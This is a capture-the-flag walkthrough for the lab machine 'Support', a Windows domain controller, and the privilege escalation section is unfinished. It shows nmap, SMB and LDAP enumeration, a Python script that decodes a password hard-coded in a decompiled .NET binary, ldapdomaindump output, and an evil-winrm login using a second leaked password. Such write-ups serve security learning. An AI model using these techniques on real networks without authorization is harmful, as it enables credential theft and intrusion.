# Support

---

## Setup

Spawned in the machine as always, got the IP and stored it in an environment variable in case I lose it -as always-

```shell
$ export IP=10.10.11.174
$ echo $IP
10.10.11.174
```

and to make sure everything is working alright and the target machine is up and running, we can use `ping` to make sure it's alive.

```shell
$ ping $IP
PING 10.10.11.174 (10.10.11.174) 56(84) bytes of data.
64 bytes from 10.10.11.174: icmp_seq=1 ttl=63 time=69.3 ms
64 bytes from 10.10.11.174: icmp_seq=2 ttl=63 time=68.1 ms
64 bytes from 10.10.11.174: icmp_seq=3 ttl=63 time=67.9 ms
64 bytes from 10.10.11.174: icmp_seq=4 ttl=63 time=70.4 ms
```

---

## Scan

First step after spawning in the target machine and connected to the VPN, I start an [`nmap`](https://nmap.org) scan to determine open ports and running services and may be vulnerable using the following flags:

`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-p-`: Scan all possible ports
`-v`: Verbose output for more information about the scan
`-oN`: Write the output of the scan into a file

```shell
$ nmap -sV -sC -p- -v -oN scan.nmap $IP
```

The scan is interrupted and nmap suggests `Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn`. This means that the target machine is blocked nmap's ping scan which is its starting step to determine whether the host is up or down, this probably means that the target machine is running Windows OS, so I used the flag `-Pn` to treat the host as alive and skip this initial checking step.

After the scan is complete, here's the result:

```shell
Nmap scan report for 10.10.11.174
Host is up (0.079s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-17 01:19:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
61469/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-17T01:20:05
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

This scan shows that the target machine is a Windows server running Active Directory, but first I start by enumerating the DNS server to confirm the system's name, since I now know that the Domain Controller (DC) name is `support.htb`

```shell
└─$ dig @$IP +short support.htb any  
10.10.11.174
dc.support.htb.
dc.support.htb. hostmaster.support.htb. 105 900 600 86400 3600
```

This shows that the server's computer name is `dc` and the domain name is `support.htb`, I also updated my `/etc/hosts` file with these DNS entries to make it easier to work with later on.

---

## Samba Enumeration

To start off, I first started enumrating the SMB file shares since it's a good start and can give good intel:

```shell
└─$ smbclient -L $IP                                                              
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share
```

I tried connecting to these shares, but none of them accepted a non-password connection except for `support-tools` which I grapped using the following command:

```shell
└─$ smbclient \\\\$IP\\support-tools
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 967532 blocks available
smb: \> mget *
````

All these files look pretty normal for a support team's shared folder, except for `UserInfo.exe.zip` which does not appear to be common, so I unzipped it and decompiled `UserInfo.exe` using `ilspycmd`. After quite some time reading through this code, I found there's a hard coded connection to the Active Directory server, now I own the username and the connection protocol used `SUPPORT\ldap`, but the password is encoded with some XOR operations in `getPassword()` function.

The LDAP Query constructor
```C#
	public LdapQuery()
		{
			// ----
			string password = Protected.getPassword();
			entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
			entry.set_AuthenticationType((AuthenticationTypes)1);
			ds = new DirectorySearcher(entry);
		}
```

Password obfuscation function:

```C#
internal class Protected
	{
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		private static byte[] key = Encoding.ASCII.GetBytes("armando");

		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
			}
			return Encoding.Default.GetString(array2);
		}
	}
```

I wrote a python script to decode the password, and the password is `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`.

```python
import base64

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = "armando".encode("ascii")

for i in range(len(enc_password)):
	print(chr((enc_password[i] ^ key[i % len(key)]) ^ 0xdf ), end="")

print()
```

---

## LDAP Enumeration

I started enumrating user information in the Active Directory using the credentials I found previously using `ldapdomaindump` tool to dump all user details:

```shell
└─$ ldapdomaindump dc.support.htb -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

└─$ ls                                                                                       
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep

````

Then I started cruising around in the `.html` files to see which user can I target to gain access to the machine. A few minutes later I foudnd that the `support` user has the most permissions and I probably should target that user.

After several hours of poking around and cruising `ldapdomaindump`'s output, I finally found something interesting in `domain_users.json` file, something weird that almost looks like a password to me, compared to the previous password I cracked, looks similar in its form:

```json
	"distinguishedName": [
            "CN=support,CN=Users,DC=support,DC=htb"
        ],
        "info": [
            "Ironside47pleasure40Watchful"
        ],
        "instanceType": [
            4
        ],
```

that `info` key or field is only set for this user, so this must be this user's password. I don't really know if that is something that is usually done in real world applications "I HOPE NOT", but anyhow, I tried connecting to the DC server's command line using `evil-winrm`


```shell
└─$ evil-winrm -i $IP -u "support" -p "Ironside47pleasure40Watchful"

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents> 
````

and I'm in! I navigated through until I got the user flag.

```shell
*Evil-WinRM* PS C:\Users\support\Documents> cd C:\Users\support\Desktop
*Evil-WinRM* PS C:\Users\support\Desktop> dir


    Directory: C:\Users\support\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/17/2022   7:13 AM             34 user.txt


*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
*******************************9
*Evil-WinRM* PS C:\Users\support\Desktop> 
```

---

## Privilege Escalation

<---- TO BE CONTINUED ---->